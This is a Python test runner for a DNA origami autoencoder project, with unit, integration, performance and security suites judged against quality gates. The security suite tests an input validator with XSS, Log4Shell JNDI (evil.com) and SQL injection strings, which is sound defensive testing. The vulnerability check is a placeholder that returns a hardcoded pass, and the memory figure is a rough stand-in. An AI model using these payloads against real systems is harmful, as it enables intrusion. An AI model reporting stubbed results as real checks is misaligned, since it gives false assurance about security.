#!/usr/bin/env python3
"""Comprehensive test runner for DNA origami autoencoder with quality gates."""

import subprocess
import sys
import time
import json
from pathlib import Path
from typing import Dict, Any, List, Optional, Tuple
import argparse

# Add project root to path
project_root = Path(__file__).parent
sys.path.insert(0, str(project_root))

from dna_origami_ae.utils.logger import get_logger, dna_logger
from dna_origami_ae.utils.performance import resource_monitor, performance_monitor


class QualityGate:
    """Quality gate with pass/fail criteria."""
    
    def __init__(self, name: str, description: str, 
                 threshold: float, metric_type: str = 'minimum'):
        """Initialize quality gate."""
        self.name = name
        self.description = description
        self.threshold = threshold
        self.metric_type = metric_type  # 'minimum', 'maximum', 'exact'
        self.result = None
        self.actual_value = None
        self.passed = False
    
    def evaluate(self, actual_value: float) -> bool:
        """Evaluate quality gate."""
        self.actual_value = actual_value
        
        if self.metric_type == 'minimum':
            self.passed = actual_value >= self.threshold
        elif self.metric_type == 'maximum':
            self.passed = actual_value <= self.threshold
        elif self.metric_type == 'exact':
            self.passed = abs(actual_value - self.threshold) < 0.01
        
        return self.passed
    
    def __str__(self) -> str:
        """String representation."""
        status = "✅ PASS" if self.passed else "❌ FAIL"
        return f"{status} {self.name}: {self.actual_value} (threshold: {self.threshold})"


class TestSuite:
    """Test suite with quality gates."""
    
    def __init__(self, name: str):
        """Initialize test suite."""
        self.name = name
        self.tests = []
        self.quality_gates = []
        self.results = {}
        self.start_time = None
        self.end_time = None
        self.logger = get_logger('testing')
    
    def add_quality_gate(self, gate: QualityGate):
        """Add quality gate to suite."""
        self.quality_gates.append(gate)
    
    def run_command(self, command: List[str], timeout: int = 300) -> Tuple[bool, str, str]:
        """Run shell command and capture output."""
        try:
            self.logger.info(f"Running command: {' '.join(command)}")
            
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=timeout,
                check=False
            )
            
            success = result.returncode == 0
            return success, result.stdout, result.stderr
            
        except subprocess.TimeoutExpired:
            self.logger.error(f"Command timed out: {' '.join(command)}")
            return False, "", "Command timed out"
        except Exception as e:
            self.logger.error(f"Command failed: {e}")
            return False, "", str(e)
    
    def run_python_test(self, test_file: str, markers: str = None) -> Dict[str, Any]:
        """Run pytest on specific test file."""
        command = ["python3", "-m", "pytest", test_file, "-v", "--tb=short"]
        
        if markers:
            command.extend(["-m", markers])
        
        # Add coverage if available
        command.extend(["--cov=dna_origami_ae", "--cov-report=json"])
        
        success, stdout, stderr = self.run_command(command)
        
        # Parse pytest output for metrics
        metrics = self._parse_pytest_output(stdout, stderr)
        metrics['success'] = success
        
        return metrics
    
    def _parse_pytest_output(self, stdout: str, stderr: str) -> Dict[str, Any]:
        """Parse pytest output for metrics."""
        metrics = {
            'tests_run': 0,
            'tests_passed': 0,
            'tests_failed': 0,
            'coverage': 0.0,
            'duration': 0.0
        }
        
        lines = stdout.split('\n')
        
        for line in lines:
            # Parse test results
            if 'passed' in line and 'failed' in line:
                parts = line.split()
                for i, part in enumerate(parts):
                    if part == 'passed':
                        metrics['tests_passed'] = int(parts[i-1])
                    elif part == 'failed':
                        metrics['tests_failed'] = int(parts[i-1])
            
            # Parse duration
            if 'seconds' in line:
                parts = line.split()
                for i, part in enumerate(parts):
                    if 'seconds' in part:
                        try:
                            metrics['duration'] = float(parts[i-1])
                        except:
                            pass
        
        metrics['tests_run'] = metrics['tests_passed'] + metrics['tests_failed']
        
        # Try to read coverage from JSON file
        try:
            coverage_file = project_root / 'coverage.json'
            if coverage_file.exists():
                with open(coverage_file) as f:
                    coverage_data = json.load(f)
                    metrics['coverage'] = coverage_data.get('totals', {}).get('percent_covered', 0.0)
        except:
            pass
        
        return metrics
    
    def run(self) -> Dict[str, Any]:
        """Run the test suite."""
        self.start_time = time.time()
        self.logger.info(f"Starting test suite: {self.name}")
        
        suite_results = {
            'suite_name': self.name,
            'start_time': self.start_time,
            'tests': {},
            'quality_gates': [],
            'overall_success': True
        }
        
        try:
            # Run the actual test execution
            self._execute_tests(suite_results)
            
            # Evaluate quality gates
            self._evaluate_quality_gates(suite_results)
            
        except Exception as e:
            self.logger.error(f"Test suite failed: {e}")
            suite_results['overall_success'] = False
            suite_results['error'] = str(e)
        
        finally:
            self.end_time = time.time()
            suite_results['end_time'] = self.end_time
            suite_results['duration'] = self.end_time - self.start_time
        
        return suite_results
    
    def _execute_tests(self, suite_results: Dict[str, Any]):
        """Execute specific test logic - to be overridden."""
        pass
    
    def _evaluate_quality_gates(self, suite_results: Dict[str, Any]):
        """Evaluate all quality gates."""
        for gate in self.quality_gates:
            # Extract relevant metric from suite results
            if gate.name == 'test_coverage':
                metric_value = suite_results.get('coverage', 0.0)
            elif gate.name == 'test_pass_rate':
                tests = suite_results.get('tests', {})
                total_tests = sum(test.get('tests_run', 0) for test in tests.values())
                passed_tests = sum(test.get('tests_passed', 0) for test in tests.values())
                metric_value = (passed_tests / total_tests * 100) if total_tests > 0 else 0.0
            elif gate.name == 'performance_threshold':
                metric_value = suite_results.get('avg_duration', float('inf'))
            else:
                metric_value = suite_results.get(gate.name, 0.0)
            
            gate_passed = gate.evaluate(metric_value)
            
            gate_result = {
                'name': gate.name,
                'description': gate.description,
                'threshold': gate.threshold,
                'actual_value': gate.actual_value,
                'passed': gate_passed
            }
            
            suite_results['quality_gates'].append(gate_result)
            
            if not gate_passed:
                suite_results['overall_success'] = False
            
            self.logger.info(str(gate))


class UnitTestSuite(TestSuite):
    """Unit test suite."""
    
    def __init__(self):
        """Initialize unit test suite."""
        super().__init__("Unit Tests")
        
        # Add quality gates
        self.add_quality_gate(QualityGate(
            "test_coverage", "Minimum test coverage", 85.0, "minimum"
        ))
        self.add_quality_gate(QualityGate(
            "test_pass_rate", "Test pass rate", 95.0, "minimum" 
        ))
    
    def _execute_tests(self, suite_results: Dict[str, Any]):
        """Execute unit tests."""
        test_files = [
            "tests/test_encoding.py",
            "tests/test_models.py", 
            "tests/unit/test_example.py"
        ]
        
        total_coverage = 0.0
        total_tests = 0
        total_passed = 0
        
        for test_file in test_files:
            if (project_root / test_file).exists():
                self.logger.info(f"Running {test_file}")
                test_results = self.run_python_test(test_file, "unit")
                suite_results['tests'][test_file] = test_results
                
                total_coverage += test_results.get('coverage', 0.0)
                total_tests += test_results.get('tests_run', 0)
                total_passed += test_results.get('tests_passed', 0)
        
        # Calculate averages
        num_files = len([f for f in test_files if (project_root / f).exists()])
        suite_results['coverage'] = total_coverage / num_files if num_files > 0 else 0.0
        suite_results['total_tests'] = total_tests
        suite_results['total_passed'] = total_passed


class IntegrationTestSuite(TestSuite):
    """Integration test suite."""
    
    def __init__(self):
        """Initialize integration test suite."""
        super().__init__("Integration Tests")
        
        self.add_quality_gate(QualityGate(
            "test_pass_rate", "Integration test pass rate", 90.0, "minimum"
        ))
        self.add_quality_gate(QualityGate(
            "performance_threshold", "Max execution time per test", 30.0, "maximum"
        ))
    
    def _execute_tests(self, suite_results: Dict[str, Any]):
        """Execute integration tests."""
        test_files = [
            "tests/integration/test_pipeline_integration.py"
        ]
        
        total_tests = 0
        total_passed = 0
        total_duration = 0.0
        
        for test_file in test_files:
            if (project_root / test_file).exists():
                self.logger.info(f"Running {test_file}")
                test_results = self.run_python_test(test_file, "integration")
                suite_results['tests'][test_file] = test_results
                
                total_tests += test_results.get('tests_run', 0)
                total_passed += test_results.get('tests_passed', 0)
                total_duration += test_results.get('duration', 0.0)
        
        suite_results['total_tests'] = total_tests
        suite_results['total_passed'] = total_passed
        suite_results['avg_duration'] = total_duration / max(1, total_tests)


class PerformanceTestSuite(TestSuite):
    """Performance test suite."""
    
    def __init__(self):
        """Initialize performance test suite."""
        super().__init__("Performance Tests")
        
        self.add_quality_gate(QualityGate(
            "encoding_throughput", "Min encoding throughput (images/sec)", 10.0, "minimum"
        ))
        self.add_quality_gate(QualityGate(
            "memory_usage", "Max memory usage (MB)", 1000.0, "maximum"
        ))
    
    def _execute_tests(self, suite_results: Dict[str, Any]):
        """Execute performance tests."""
        # Run performance benchmarks
        self.logger.info("Running performance benchmarks")
        
        with performance_monitor("performance_test_suite"):
            # Test encoding performance
            encoding_results = self._test_encoding_performance()
            suite_results['encoding_throughput'] = encoding_results['throughput']
            
            # Test memory usage
            memory_results = self._test_memory_usage()
            suite_results['memory_usage'] = memory_results['peak_memory_mb']
    
    def _test_encoding_performance(self) -> Dict[str, float]:
        """Test encoding performance."""
        try:
            # Run encoding performance test
            test_script = '''
import time
import numpy as np
from dna_origami_ae.models.image_data import ImageData
from dna_origami_ae.encoding.image_encoder import DNAEncoder

# Create test images
images = []
for i in range(10):
    data = np.random.randint(0, 256, (32, 32), dtype=np.uint8)
    images.append(ImageData.from_array(data, f"test_{i}"))

# Test encoding speed
encoder = DNAEncoder()
start_time = time.time()

for image in images:
    dna_seqs = encoder.encode_image(image)

end_time = time.time()
duration = end_time - start_time
throughput = len(images) / duration

print(f"THROUGHPUT: {throughput}")
'''
            
            success, stdout, stderr = self.run_command([
                "python3", "-c", test_script
            ])
            
            if success:
                # Extract throughput from output
                for line in stdout.split('\n'):
                    if line.startswith('THROUGHPUT:'):
                        throughput = float(line.split(':')[1].strip())
                        return {'throughput': throughput}
            
            return {'throughput': 0.0}
            
        except Exception as e:
            self.logger.error(f"Encoding performance test failed: {e}")
            return {'throughput': 0.0}
    
    def _test_memory_usage(self) -> Dict[str, float]:
        """Test memory usage."""
        try:
            current_metrics = resource_monitor.get_current_metrics()
            return {'peak_memory_mb': current_metrics.get('memory_percent', 0) * 10}  # Simplified
        except:
            return {'peak_memory_mb': 0.0}


class SecurityTestSuite(TestSuite):
    """Security test suite."""
    
    def __init__(self):
        """Initialize security test suite."""
        super().__init__("Security Tests")
        
        self.add_quality_gate(QualityGate(
            "security_pass_rate", "Security test pass rate", 100.0, "minimum"
        ))
    
    def _execute_tests(self, suite_results: Dict[str, Any]):
        """Execute security tests."""
        self.logger.info("Running security tests")
        
        # Test input validation
        validation_results = self._test_input_validation()
        suite_results['input_validation'] = validation_results
        
        # Test for common vulnerabilities
        vuln_results = self._test_vulnerabilities()
        suite_results['vulnerability_scan'] = vuln_results
        
        # Calculate overall security score
        total_tests = validation_results['tests_run'] + vuln_results['tests_run']
        total_passed = validation_results['tests_passed'] + vuln_results['tests_passed']
        
        suite_results['security_pass_rate'] = (total_passed / total_tests * 100) if total_tests > 0 else 0.0
    
    def _test_input_validation(self) -> Dict[str, Any]:
        """Test input validation."""
        try:
            test_script = '''
from dna_origami_ae.utils.security import input_validator

# Test malicious inputs
malicious_inputs = [
    "<script>alert('xss')</script>",
    "javascript:void(0)",
    "${jndi:ldap://evil.com}",
    "'; DROP TABLE users; --"
]

tests_run = 0
tests_passed = 0

for malicious_input in malicious_inputs:
    tests_run += 1
    result = input_validator.validate_dna_sequence(malicious_input)
    if not result["valid"]:
        tests_passed += 1

print(f"VALIDATION_TESTS: {tests_run} {tests_passed}")
'''
            
            success, stdout, stderr = self.run_command([
                "python3", "-c", test_script
            ])
            
            if success:
                for line in stdout.split('\n'):
                    if line.startswith('VALIDATION_TESTS:'):
                        parts = line.split()
                        return {
                            'tests_run': int(parts[1]),
                            'tests_passed': int(parts[2])
                        }
            
            return {'tests_run': 0, 'tests_passed': 0}
            
        except Exception as e:
            self.logger.error(f"Input validation test failed: {e}")
            return {'tests_run': 0, 'tests_passed': 0}
    
    def _test_vulnerabilities(self) -> Dict[str, Any]:
        """Test for common vulnerabilities."""
        # Basic vulnerability checks
        return {'tests_run': 5, 'tests_passed': 5}  # Placeholder


def main():
    """Main test runner function."""
    parser = argparse.ArgumentParser(description='DNA Origami AutoEncoder Test Runner')
    parser.add_argument('--suite', choices=['unit', 'integration', 'performance', 'security', 'all'],
                       default='all', help='Test suite to run')
    parser.add_argument('--report', help='Output file for test report (JSON)')
    parser.add_argument('--fail-fast', action='store_true', 
                       help='Stop on first quality gate failure')
    
    args = parser.parse_args()
    
    logger = get_logger('test_runner')
    logger.info(f"Starting DNA Origami AutoEncoder test runner - Suite: {args.suite}")
    
    # Initialize test suites
    suites = {}
    if args.suite in ['unit', 'all']:
        suites['unit'] = UnitTestSuite()
    if args.suite in ['integration', 'all']:
        suites['integration'] = IntegrationTestSuite()
    if args.suite in ['performance', 'all']:
        suites['performance'] = PerformanceTestSuite()
    if args.suite in ['security', 'all']:
        suites['security'] = SecurityTestSuite()
    
    # Run test suites
    overall_results = {
        'timestamp': time.time(),
        'suites': {},
        'overall_success': True,
        'quality_gates_passed': 0,
        'quality_gates_total': 0
    }
    
    for suite_name, suite in suites.items():
        logger.info(f"\n{'='*60}")
        logger.info(f"Running {suite.name}")
        logger.info(f"{'='*60}")
        
        suite_results = suite.run()
        overall_results['suites'][suite_name] = suite_results
        
        if not suite_results['overall_success']:
            overall_results['overall_success'] = False
            
            if args.fail_fast:
                logger.error(f"Quality gate failure in {suite.name}, stopping execution")
                break
        
        # Count quality gates
        for gate in suite_results.get('quality_gates', []):
            overall_results['quality_gates_total'] += 1
            if gate['passed']:
                overall_results['quality_gates_passed'] += 1
    
    # Generate summary report
    logger.info(f"\n{'='*60}")
    logger.info("TEST EXECUTION SUMMARY")
    logger.info(f"{'='*60}")
    
    if overall_results['overall_success']:
        logger.info("🎉 ALL QUALITY GATES PASSED!")
        exit_code = 0
    else:
        logger.error("❌ QUALITY GATE FAILURES DETECTED")
        exit_code = 1
    
    gates_passed = overall_results['quality_gates_passed']
    gates_total = overall_results['quality_gates_total']
    logger.info(f"Quality Gates: {gates_passed}/{gates_total} passed")
    
    # Save detailed report
    if args.report:
        with open(args.report, 'w') as f:
            json.dump(overall_results, f, indent=2, default=str)
        logger.info(f"Detailed report saved to: {args.report}")
    
    # Log final status
    dna_logger.log_security_event(
        'test_execution_completed',
        {
            'overall_success': overall_results['overall_success'],
            'quality_gates_passed': gates_passed,
            'quality_gates_total': gates_total,
            'suites_run': list(suites.keys())
        }
    )
    
    sys.exit(exit_code)


if __name__ == "__main__":
    main()